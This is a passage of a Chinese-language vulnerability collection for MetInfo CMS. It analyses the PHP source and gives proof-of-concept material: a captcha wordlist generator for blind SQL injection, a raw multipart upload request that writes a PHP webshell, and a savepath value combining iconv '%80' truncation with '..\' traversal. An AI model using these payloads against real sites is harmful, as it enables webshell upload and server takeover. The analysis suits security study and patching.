href="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%207.png"><img style="width:432px" src="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%207.png"/></a></figure></div></p><p id="fe0b75ee-61c5-4a9a-8d63-21370314d6cb" class="">思考：<div class="indented"><p id="f5bdc364-14b7-4061-a867-06ea5435142d" class="">这里我们可以使用爆破验证码结合时间盲注的方式进行攻击，用以下程序生成全排列验证码字典：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4ca98a66-31b8-407d-9e10-5cc622b71b82" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">from itertools import product
+rand_chrs=&quot;A2B3C4D5E6F7G8H9iJKLMNPQRSTUVWXYZ&quot;
+with open(&quot;codes.txt&quot;,&#x27;w&#x27;) as f:
+    for code in product(rand_chrs,rand_chrs,rand_chrs,rand_chrs):
+        code = &#x27;&#x27;.join(list(code))
+        print(code)
+        f.write(code+&#x27;\n&#x27;)
+</code></pre><p id="994a062f-a22b-464e-b7b4-4c68d7984f6d" class="">但是这样的攻击成本还是太高了，如果大家会机器学习，可以加入相关算法来自动识别验证码。</p></div></p></details></li></ul><blockquote id="19dd7628-3ac2-4bab-bd32-b614956d3d1b" class="">↑总结就是：<p id="823b8ec2-94e1-4d4c-9057-6ffbb8b8a721" class="">寄，还是用“在线留言处”就好了，在线反馈这里不太好注入</p></blockquote><p id="46106678-06b6-43f7-beed-bbca40b02fa6" class="">还有一些更多的其他入口点，只要是用到<strong>message.class</strong>类来处理表单的id项的，都有这个sql注入漏洞。</p><h3 id="768b172c-abff-42c2-9285-d2a67c895982" class="">2-前台任意文件上传漏洞</h3><p id="3f1232c9-fe23-4854-b522-49bedb46d428" class=""><strong>【条件&amp;影响】</strong></p><p id="e0f4af8e-8db9-4855-9dd1-07166dd3035c" class="">版本：6.1.3</p><p id="e599145a-015a-4317-963e-790abd6fc468" class=""><strong>【原理】</strong></p><p id="20dca624-e0b0-41d3-b23b-431a9cfdfafd" class="">漏洞文件存在于 <strong>app/system/include/class/web.class.php</strong> 文件中。</p><p id="1a40427e-38bb-8061-83eb-f17032dfe704" class="">我们可以看到当满足条件：<mark class="highlight-default"><code>$_M[&#x27;form&#x27;][&#x27;metinfonow&#x27;] == $_M[&#x27;config&#x27;][&#x27;met_member_force&#x27;]</code></mark> 时， <strong>web</strong> 类的析构函数会将缓冲区的数据写入一个可控的文件中，其代码具体如下：</p><figure id="cb30ab75-60f5-43aa-a390-b7d45970bbc6" class="image"><a href="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%208.png"><img style="width:503.3333435058594px" src="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%208.png"/></a></figure><p id="76a61d51-2750-456e-b941-985ac7a52647" class="">利用路线如下：</p><p id="54de4cfc-9309-4610-ba77-fba3f933040d" class="">1、泄露$_M[&#x27;config&#x27;][&#x27;met_member_force&#x27;]<div class="indented"><p id="411eff9c-beab-4562-983b-8ddc6fe9ddd5" class="">$_M[&#x27;config&#x27;][&#x27;met_member_force&#x27;]是通过 randStr 函数随机生成 7个 字符。</p><p id="082c2a3f-49e7-471d-9c98-ff5258f12a14" class="">在Metinfo6.1.3 版本中，我们发现虽然”在线留言处“的洞被修了，但是“反馈处”的洞没修，我们可以<mark class="highlight-blue">通过对它的sql盲注泄露$_M[&#x27;config&#x27;][&#x27;met_member_force&#x27;]的值</mark>。</p></div></p><p id="8b68f777-0aa7-4dc9-bc43-5c33bf943a52" class="">2、找一个可以把恶意数据写到缓冲区上的类<div class="indented"><blockquote id="02a6d722-ed57-4b2e-ab1c-8695ab7b3fd1" class="">这个类必须是web的子类，这样才能继承并使用到web类的这一逆天构析函数__destruct()</blockquote><p id="74cf2c7f-b6ac-4a9b-a259-877325457784" class="">我们找到一个有一个 <strong>uploadify</strong> 子类非常适合。该类不管上传操作成功与否，都会将相关信息输出（即可将数据送入缓冲区）。</p><ul id="ae9e3dbd-2631-4c75-a7e1-95608ec80da8" class="toggle"><li><details open=""><summary>↑关于分析出“类不管上传操作成功与否，都会将相关信息输出”的详细分析过程</summary><p id="9264e941-419e-44ec-a133-28a848faa537" class="">该类中有多个方法均可利用，我们随机选取一个 <strong>doupfile</strong> 方法来分析。</p><p id="5875e520-86e5-4683-83df-acbdb9646abb" class="">我们可以看到下图代码 <strong>第17行</strong> 直接将 <strong>$back</strong> 变量输出，我们跟进到 <strong>第15行</strong> ，观察该变量值的来源。</p><figure id="300ec664-b974-4325-85e7-862273a6727f" class="image"><a href="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%209.png"><img style="width:480px" src="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%209.png"/></a></figure><p id="47f4f992-0ec2-40a7-935d-f5fe6fd81dd3" class="">从上图代码中，我们可以清晰的看到 <strong>$back</strong> 变量来源于可控的 <strong>$_M[&#x27;form&#x27;][&#x27;formname&#x27;]</strong> ，我们跟进对其处理的  <strong>upfile</strong> 类的 <strong>upload</strong> 方法，具体代码如下：</p><figure id="046d70d1-4af2-42ee-b637-00ea2bb0a3a8" class="image"><a href="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%2010.png"><img style="width:480px" src="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%2010.png"/></a></figure><p id="9fa5660f-86a8-4554-8bd2-af928544666f" class="">我们看到 <strong>第30行</strong> 代码，如果 <strong>$this-&gt;ext</strong> 类型不再数据库中，就将其返回，而如果我们将文件名设置为 <strong>&lt;?php phpinfo();?&gt;</strong> ，这样这段代码也会被输出到缓冲区中。接着回到我们文章开头的代码中，便可成功写入 <strong>shell</strong> 。</p></details></li></ul></div></p><p id="21ea9ff4-75cd-45e0-95cd-9a6ef9a7d91d" class="">3、在请求的url传参中，携带metinfonow即可<div class="indented"><p id="48c981e1-bfc9-48bd-b560-a1be005c5db3" class="">它的值要设置成我们刚刚爆出来的$_M[&#x27;config&#x27;][&#x27;met_member_force&#x27;]值</p></div></p><p id="db5ca28e-6421-46a6-9cf5-974efb2d5ab4" class=""><strong>【poc&amp;利用方式】</strong></p><p id="d69550ba-93a6-4682-8787-7b4f4065f28d" class="">这里要改一下文件的内容，并且要改一下url传参中metinfonow的值，改为我们刚刚盲注爆出来的那个值</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a87823f5-dfec-435e-b441-65763c55abbe" class="code"><code class="language-Plain Text">POST /metinfo/admin/index.php?c=uploadify&amp;m=include&amp;a=doupfile&amp;lang=cn&amp;metinfonow=qipwtxm&amp;html_filename=1.php HTTP/1.1
+Host: localhost
+Content-Length: 196
+Origin: http://localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8tQiXReYsQYXHadW
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: XDEBUG_SESSION=PHPSTORM
+Connection: close
+
+------WebKitFormBoundary8tQiXReYsQYXHadW
+Content-Disposition: form-data; name=&quot;test&quot;; filename=&quot;&lt;?php phpinfo();?&gt;&quot;
+Content-Type: image/jpeg
+
+test
+------WebKitFormBoundary8tQiXReYsQYXHadW--</code></pre><figure id="0dd1160c-9a56-49b1-a976-47ca9953322d" class="image"><a href="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%2011.png"><img style="width:503.3333435058594px" src="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/Untitled%2011.png"/></a></figure><h3 id="81df19ed-1d3d-46d0-a5b9-82523b873f83" class="">3-Metinfo&lt;6.2.0任意文件上传</h3><p id="b99564ba-26b6-4480-b29f-5e377514528d" class="">【介绍】</p><p id="f9b920ab-e41c-4d8d-8147-b57daa4f201a" class="">可上传任意文件到网站根目录下，导致getshell</p><p id="c6ea8b66-e915-4b72-bfdc-4fe5fda35a64" class="">【条件&amp;影响】</p><p id="0a882d33-c09a-41ae-8e68-8868e9ba5d93" class="">1、版本&lt;6.2.0</p><p id="a31baad3-540c-44c2-9b84-54ef5fec2df2" class="">2、windows系统，PHP语言的版本是小于5.3</p><blockquote id="5b63db36-0d65-4b7d-ac11-8ee1e30fff66" class="">许多旧的网站都是这个配置</blockquote><p id="f03a6271-24a5-49e6-8591-7bad23203c28" class="">【原理】</p><p id="cec8c2b4-2727-41cb-b3e6-cd11bf2e27c2" class="">没错，和前一个漏洞一样，我们又来迫害 uploadify 子类的doupfile方法了</p><ul id="51f2cc7a-7378-427c-8835-5c3387fe2e51" class="toggle"><li><details open=""><summary>代码分析如下</summary><p id="2851a18e-ceb2-4035-aa48-b4c9c3113efa" class="">该方法位于uploadify对象，代码如下：<div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="929ab23e-171d-4c92-a073-676cda88f42e" class="code"><code class="language-Plain Text">// app/system/include/module/uploadify.class.php
+
+class uploadify extends web {
+    // 定义一个处理文件上传的函数
+    public function dopufile() {
+        global $_M; // 引用全局变量 $_M,该全局变量来自用户表单输入，其中存储了文件名、路径、尺寸等信息
+
+        // 调用 upfile 的 set_upfile 方法来初始化设置upfile对象的参数配置
+        $this-&gt;upfile-&gt;set_upfile();
+
+        // 初始化 $info 数组并设置文件上传的参数
+        $info[&#x27;savepath&#x27;] = $_M[&#x27;form&#x27;][&#x27;savepath&#x27;];       // 设置保存路径
+        $info[&#x27;format&#x27;] = $_M[&#x27;form&#x27;][&#x27;format&#x27;];           // 设置文件格式
+        $info[&#x27;maxsize&#x27;] = $_M[&#x27;form&#x27;][&#x27;maxsize&#x27;];         // 设置文件最大尺寸
+        $info[&#x27;is_rename&#x27;] = $_M[&#x27;form&#x27;][&#x27;is_rename&#x27;];     // 设置是否重命名
+        $info[&#x27;is_overwrite&#x27;] = $_M[&#x27;form&#x27;][&#x27;is_overwrite&#x27;]; // 设置是否覆盖
+
+        // 调用 set_upload 方法来设置upload函数的配置信息
+        $this-&gt;set_upload($info);
+
+        // 调用upload方法执行文件上传（包括一些安全性检查），传参是用户表单输入中的文件名
+        $back = $this-&gt;upload($_M[&#x27;form&#x27;][&#x27;formname&#x27;]);
+
+        // 根据上传结果处理返回值
+        if ($_M[&#x27;form&#x27;][&#x27;type&#x27;] == 1) {
+            if ($back[&#x27;error&#x27;]) {
+                // 如果有错误，设置返回的错误代码
+                $back[&#x27;error&#x27;] = $back[&#x27;errorcode&#x27;];
+            } else {
+                // 否则，设置返回的路径信息
+                $backs[&#x27;path&#x27;] = $back[&#x27;path&#x27;];
+            }
+            $backs[&#x27;append&#x27;] = &#x27;false&#x27;; // 设置 append 为 false
+        }
+    }
+}</code></pre></div></p><ul id="eb20df7f-ec91-412c-9cb5-b346210ba448" class="toggle"><li><details open=""><summary>1、这里我们先追踪着它依次进入set_upfile和set_upload函数</summary><p id="f268c11f-605c-4a02-a9a4-3ea8e4a1ae10" class="">set_upfile代码：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6665a136-7ad2-46b6-9dea-340aa46987c8" class="code"><code class="language-Plain Text">public function set_upfile() {
+	global $_M;
+	$this-&gt;set(&#x27;savepath&#x27;, &#x27;file&#x27;);
+	$this-&gt;set(&#x27;format&#x27;, $_M[&#x27;config&#x27;][&#x27;met_file_format&#x27;]);
+	$this-&gt;set(&#x27;maxsize&#x27;, min($_M[&#x27;config&#x27;][&#x27;met_file_maxsize&#x27;]*1048576, 1073741824));
+	$this-&gt;set(&#x27;is_rename&#x27;, $_M[&#x27;config&#x27;][&#x27;met_img_rename&#x27;]);
+}</code></pre><p id="946b6135-0b6b-4773-8675-80554bd4b5b6" class="">set_upload代码：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ddfa626f-020f-43ea-b373-00365473b052" class="code"><code class="language-Plain Text">public function set_upload($info){
+	global $_M;
+	$this-&gt;upfile-&gt;set(&#x27;savepath&#x27;, $info[&#x27;savepath&#x27;]);
+	$this-&gt;upfile-&gt;set(&#x27;format&#x27;, $info[&#x27;format&#x27;]);
+	$this-&gt;upfile-&gt;set(&#x27;maxsize&#x27;, $info[&#x27;maxsize&#x27;]);
+	$this-&gt;upfile-&gt;set(&#x27;is_rename&#x27;, $info[&#x27;is_rename&#x27;]);
+	$this-&gt;upfile-&gt;set(&#x27;is_overwrite&#x27;, $info[&#x27;is_overwrite&#x27;]);
+}</code></pre><p id="d54b02b5-c1ab-4fa4-89cc-238509cc9588" class="">其中set函数代码为：<div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e81e89f2-644d-490a-988d-327eda8d62a1" class="code"><code class="language-Plain Text">public function set($name, $value) {
+		     ... ...
+		switch ($name) {
+			case &#x27;savepath&#x27;:
+				$this-&gt;savepath = path_standard(PATH_WEB.&#x27;upload/&#x27;.$value);
+             ... ...
+		}
+	}</code></pre></div></p><p id="fd9527f2-e153-41a4-808b-1f17e2e0170f" class="">我们可以看到这两个函数均对来自表单的savepath(用户可靠)进行处理，处理的结果是相当于在它的路径前面加上字符串“webserver/upload/file/”</p></details></li></ul><ul id="52946dc0-4499-443b-a795-05dbece892bb" class="toggle"><li><details open=""><summary>2、接着，它进入了upload方法（重点！）</summary><p id="1dfd180d-921e-4c1d-8d51-d14920e181b6" class="">这里给出upload方法的部分源码</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="34b2aad4-4928-452e-9ebc-f0782353e2f8" class="code"><code class="language-Plain Text">public function upload($form = &#x27;&#x27;) {
+		global $_M;
+		if($form){
+			foreach($_FILES as $key =&gt; $val){
+				if($form == $key){
+					$filear = $_FILES[$key];
+				}
+			}
+		}
+		if(!$filear){
+			foreach($_FILES as $key =&gt; $val){
+				$filear = $_FILES[$key];
+				break;
+			}
+		}
+
+		...//是否能正常上传
+		...//空间超容 有些虚拟主机不支持此函数
+    ...//目录不可写
+    ...//文件大小是否正确{}
+		
+		// *文件后缀是否为合法后缀
+		$this-&gt;getext($filear[&quot;name&quot;]); //获取后缀到ext属性
+		//基于黑名单的检查
+		if (strtolower($this-&gt;ext)==&#x27;php&#x27;||strtolower($this-&gt;ext)==&#x27;aspx&#x27;||strtolower($this-&gt;ext)==&#x27;asp&#x27;||strtolower($this-&gt;ext)==&#x27;jsp&#x27;||strtolower($this-&gt;ext)==&#x27;js&#x27;||strtolower($this-&gt;ext)==&#x27;asa&#x27;) {
+			return $this-&gt;error($this-&gt;ext.&quot; {$_M[&#x27;word&#x27;][&#x27;upfileTip3&#x27;]}&quot;);
+		}
+		//基于白名单的检查，这里用到的$_M[&#x27;config&#x27;][&#x27;met_file_format&#x27;]的值是:
+		//rar|zip|sql|doc|pdf|jpg|xls|png|gif|mp3|jpeg|bmp|swf|flv|ico
+		if ($_M[&#x27;config&#x27;][&#x27;met_file_format&#x27;]) {
+			if($_M[&#x27;config&#x27;][&#x27;met_file_format&#x27;] != &quot;&quot; &amp;&amp; !in_array(strtolower($this-&gt;ext), explode(&#x27;|&#x27;,strtolower($_M[&#x27;config&#x27;][&#x27;met_file_format&#x27;]))) &amp;&amp; $filear){
+				return $this-&gt;error($this-&gt;ext.&quot; {$_M[&#x27;word&#x27;][&#x27;upfileTip3&#x27;]}&quot;);
+			}
+		} else {
+			return $this-&gt;error($this-&gt;ext.&quot; {$_M[&#x27;word&#x27;][&#x27;upfileTip3&#x27;]}&quot;);
+		}
+		if ($this-&gt;format) {
+			if ($this-&gt;format != &quot;&quot; &amp;&amp; !in_array(strtolower($this-&gt;ext), explode(&#x27;|&#x27;,strtolower($this-&gt;format))) &amp;&amp; $filear) {
+				return $this-&gt;error($this-&gt;ext.&quot; {$_M[&#x27;word&#x27;][&#x27;upfileTip3&#x27;]}&quot;);
+			}
+		}
+		//文件名重命名
+		$this-&gt;set_savename($filear[&quot;name&quot;], $this-&gt;is_rename);
+		//新建保存文件
+		if(stripos($this-&gt;savepath, PATH_WEB.&#x27;upload/&#x27;) !== 0){
+			return $this-&gt;error($_M[&#x27;word&#x27;][&#x27;upfileFail2&#x27;]);
+		}
+		
+		if(strstr($this-&gt;savepath, &#x27;./&#x27;)){
+			return $this-&gt;error($_M[&#x27;word&#x27;][&#x27;upfileTip3&#x27;]);
+		}
+		if (!makedir($this-&gt;savepath)) { //这里进行了目录创建
+			return $this-&gt;error($_M[&#x27;word&#x27;][&#x27;upfileFail2&#x27;]);
+		}
+		//复制文件
+		$upfileok=0;
+		$file_tmp=$filear[&quot;tmp_name&quot;];
+		$file_name=$this-&gt;savepath.$this-&gt;savename;
+		if (stristr(PHP_OS,&quot;WIN&quot;)) {
+			$file_name = @iconv(&quot;utf-8&quot;,&quot;GBK&quot;,$file_name);
+		}
+		if (function_exists(&quot;move_uploaded_file&quot;)) {
+			if (move_uploaded_file($file_tmp, $file_name)) {
+				$upfileok=1;
+			} else if (copy($file_tmp, $file_name)) {
+				$upfileok=1;
+			}
+		} elseif (copy($file_tmp, $file_name)) {
+			$upfileok=1;
+		}
+		if (!$upfileok) {
+			if (file_put_contents($this-&gt;savepath.&#x27;test.txt&#x27;,&#x27;metinfo&#x27;)) {
+				$_M[&#x27;word&#x27;][&#x27;upfileOver4&#x27;]=$_M[&#x27;word&#x27;][&#x27;upfileOver5&#x27;];
+			}
+			unlink($this-&gt;savepath.&#x27;test.txt&#x27;);
+			$errors = array(0 =&gt; $_M[&#x27;word&#x27;][&#x27;upfileOver4&#x27;], 1 =&gt;$_M[&#x27;word&#x27;][&#x27;upfileOver&#x27;], 2 =&gt; $_M[&#x27;word&#x27;][&#x27;upfileOver1&#x27;], 3 =&gt; $_M[&#x27;word&#x27;][&#x27;upfileOver2&#x27;], 4 =&gt; $_M[&#x27;word&#x27;][&#x27;upfileOver3&#x27;], 6=&gt; $_M[&#x27;word&#x27;][&#x27;upfileOver5&#x27;], 7=&gt; $_M[&#x27;word&#x27;][&#x27;upfileOver5&#x27;]);
+			$filear[&#x27;error&#x27;]=$filear[&#x27;error&#x27;]?$filear[&#x27;error&#x27;]:0;
+			return $this-&gt;error($errors[$filear[&#x27;error&#x27;]]);
+		} else {
+			if(stripos($filear[&#x27;tmp_name&#x27;], PATH_WEB) === false){
+				@unlink($filear[&#x27;tmp_name&#x27;]); //Delete temporary files
+			}
+		}
+		load::plugin(&#x27;doqiniu_upload&#x27;,0,array(&#x27;savename&#x27;=&gt;str_replace(PATH_WEB, &#x27;&#x27;, $this-&gt;savepath).$this-&gt;savename,&#x27;localfile&#x27;=&gt;$file_name));
+		$back = &#x27;../&#x27;.str_replace(PATH_WEB, &#x27;&#x27;, $this-&gt;savepath).$this-&gt;savename;
+		return $this-&gt;sucess($back);
+	}</code></pre><p id="38580a25-7eae-464d-8db4-6aeddcd4bd7b" class="">可以看到这里(重点按照蓝色的顺序讲)：</p><p id="891e50e4-418e-4867-8857-36dba44206e6" class="">（1）先是对文件后缀名进行了严格的基于黑白名单的过滤<div class="indented"><p id="9a55cbba-40bc-4cfc-bbf6-14afc66d65cd" class="">很严格，绕不了。</p></div></p><p id="32606d3b-3d00-4701-8830-0dbd428a0112" class="">（2）然后是调用set_savename方法对文件进行了重命名<div class="indented"><p id="0c19ded3-544a-46db-8b26-5a2acee8f875" class="">这里我们可以跟进查看函数set_savename()，代码如下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="44f0a4f6-32e8-4f25-b3b2-ccb374e4738a" class="code"><code class="language-Plain Text">protected function set_savename($filename, $is_rename) {
+	 if ($is_rename) {
+	 	... ...
+	 }else{
+      $name_verification = explode(&#x27;.&#x27;,$filename);
+	    $verification_mun = count($name_verification);
+		  if($verification_mun&gt;2){
+			$verification_mun1 = $verification_mun-1;
+			$name_verification1 = $name_verification[0];
+			for($i=0;$i&lt;$verification_mun1;$i++){
+				$name_verification1 .= &#x27;_&#x27;.$name_verification[$i];
+			}
+			$name_verification1 .= &#x27;.&#x27;.$name_verification[$verification_mun1];
+			$filename = $name_verification1;
+	     }
+    $filename = str_replace(array(&quot;:&quot;, &quot;*&quot;, &quot;?&quot;, &quot;|&quot;, &quot;/&quot; , &quot;\\&quot; , &quot;\&quot;&quot; , &quot;&lt;&quot; , &quot;&gt;&quot; , &quot;——&quot; , &quot; &quot; ),&#x27;_&#x27;,$filename);
+    ... ... </code></pre><p id="71e86b55-da43-4798-a601-6ef9cc6089bc" class="">可以看到，它是根据用户表单提交的is_rename参数来决定是否对文件名做重命名</p><p id="1a50427e-38bb-8028-952c-ef9206c0dd25" class="">最后这个str_replace太抽象了，它只处理了文件名传参没处理文件路径传参，这就导致文件路径这里可以做目录穿越</p></div></p><p id="6c944948-a9a0-4c83-b3fe-4de32898eef2" class="">（3）然后就是到“新建保存文件”代码段<div class="indented"><p id="9ddba95a-920e-43ff-9120-653c3405ecbb" class="">这里先对文件路径做了两个验证，要求是以upload开头，并且不能有<strong>‘./‘</strong></p><blockquote id="4da9e644-9b19-4df2-8c25-054bc27cccde" class="">诶，但是<strong>如果想绕过’./‘的过滤，在 windows 下可以使用’..\’来进行路径穿越。</strong></blockquote><p id="ee913c50-8f41-44cb-baa1-bbf05a3472a7" class="">然后调用makedir()方法创建了一个目录</p></div></p><p id="0e23467d-fa76-4189-bb7c-ef6b1b7ad9a9" class="">（4）然后是到“复制文件”代码段<div class="indented"><p id="4d217fb4-89c7-49b7-96ea-3d3d7a780ad0" class="">这里是先进行<mark class="highlight-default">了</mark><mark class="highlight-default"><code>savepath</code></mark><mark class="highlight-default">和</mark><mark class="highlight-default"><code>savename</code></mark><mark class="highlight-default">的字符串</mark>拼接</p><p id="46abbea0-127a-44f6-b068-250aa73e9245" class="">然后如果是windows系统就会通过<strong>iconv()</strong>函数转码，这个函数在win下，php版本小于5.4时，将会出现截断，比如shell.php%80xxxxxx,%80以后的内容会由于转码的问题，而被截断为“shell.php”——拿下！</p><p id="84f6062c-40a3-4c85-9bc5-24b2c3ee90f4" class="">然后后续函数中会将文件内容存入filename。</p></div></p></details></li></ul></details></li></ul><p id="2d60d4f7-5961-4555-a006-9621976a2e4d" class="">【poc】</p><p id="0643cfc0-7a66-4652-beb1-ac43b1627ff6" class="">抓包截取上传的数据包，设置表单<mark class="highlight-default"><code>savepath=a.php%80\..\1.jpg</code></mark><mark class="highlight-default"> 然后</mark>直接post数据到后台：http://Metinfo/admin/index.php</p><figure id="1a50427e-38bb-80a5-9fb3-d5cfc2547efa" class="image"><a href="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/image.png"><img style="width:709.9861450195312px" src="metinfo%20CMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86%20(php)%20048b0f9b0ac141658bbdd551e4df3604/image.png"/></a></figure><blockquote id="1a50427e-38bb-80c3-8d8e-c5319846b3d5" class="">之所以要直接post到网站后台的地址，是因为后台的index.php被Metinfo官方加入到白名单里，可以直接绕过sqlinsert函数的过滤，直接上传webshell到网站中，在实际的漏洞测试过程中，并不需要登录后台，直接post该地址即可</blockquote><h3 id="9591c1a8-cd5f-4df2-97d6-43b4e8a99560" class="">4-Metinfo6.0.0任意文件读取漏洞</h3><p id="4ee09e0d-80ab-40e8-aae7-2512edf09357" class="">【介绍】</p><p id="5c17a8cc-78c0-4c6e-ab93-8dff1653b89c" class="">该CMS<mark class="highlight-default">中的</mark><mark class="highlight-default"><code>/app/system/include/module/old_thumb.class.php</code></mark><mark 